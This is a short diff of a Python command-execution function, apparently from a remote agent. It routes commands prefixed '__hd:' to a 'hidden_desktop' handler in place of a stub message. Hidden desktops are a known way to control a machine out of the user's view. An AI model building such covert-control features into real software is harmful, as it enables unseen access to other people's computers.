@@ -57,7 +57,7 @@ def get_metadata():
 
 def execute_command(command: str) -> str:
     if str(command).startswith('__hd:'):
-        return 'hidden desktop requires windows'
+        return hidden_desktop(command)
     """Execute system command and return output"""
     try:
         if command.startswith('cd '):
